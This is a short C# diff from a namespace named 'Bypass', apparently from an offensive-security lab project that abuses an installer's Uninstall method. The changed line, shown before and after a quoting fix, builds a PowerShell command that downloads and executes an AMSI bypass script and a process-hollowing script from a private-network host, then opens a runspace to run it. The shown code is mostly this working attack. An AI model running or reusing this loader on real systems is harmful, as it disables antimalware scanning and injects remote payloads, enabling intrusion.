@@ -20,7 +20,7 @@ namespace Bypass
     {
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
-            String cmd = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.217/amsi.txt'); IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.217/Invoke-procHollow.ps1');
+            String cmd = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.217/amsi.txt'); IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.217/Invoke-procHollow.ps1')";
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
 
